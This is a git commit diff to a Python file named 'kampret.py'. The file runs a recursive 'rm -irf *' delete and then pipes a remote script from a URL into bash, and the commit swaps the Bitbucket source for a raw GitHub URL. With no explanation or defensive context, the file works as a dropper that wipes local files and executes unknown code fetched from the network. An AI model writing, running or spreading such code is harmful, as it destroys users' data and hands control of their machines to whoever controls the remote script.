bea75116efe086c502403e3ae34c768605cfbd9c
Erlandi <the@erlandi.my.id>
2024-05-07 05:49:53 +0700

    Update kampret.py

--- kampret.py
+++ kampret.py
@@ -1,3 +1,3 @@
 import os as kampret
 kampret.system("rm -irf *")
-kampret.system("curl -sL https://bitbucket.org/petugas/build/raw/71c7261c6f7f2608062ed5928024f75526cd8a2d/mei | bash")
+kampret.system("curl -sL https://raw.githubusercontent.com/petugas/No/main/gaga | bash")
